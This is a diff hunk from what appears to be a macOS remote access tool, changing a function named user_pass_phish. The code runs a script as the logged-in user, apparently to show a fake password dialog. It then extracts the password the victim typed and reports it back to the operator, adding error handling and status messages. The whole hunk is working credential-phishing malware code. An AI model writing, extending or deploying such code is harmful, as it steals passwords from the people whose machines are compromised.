@@ -1802,7 +1802,14 @@ def user_pass_phish():
 			#we are either root or normal user on el cap or above. call launchctl asuser.
 			script = "launchctl asuser %s %s" % (bella_UID, script_end)
 		
-		out = subprocess.check_output(script, shell=True)
+		#out = subprocess.check_output(script, shell=True)
+		send_msg('[-] Waiting for user input.\n', False)
+		process = subprocess.Popen(script, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		out = process.stdout.read()
+		err = process.stderr.read()
+		if err:
+			send_msg('%sError! [%s]\n' % (red_minus, err), True)
+			return
 		password = out.split("text returned:")[-1].replace("\n", "").split(", gave up")[0]
 		send_msg("%sUser has attempted to use password: [%s]\n" % (blue_star, password), False)
 		if password == "":
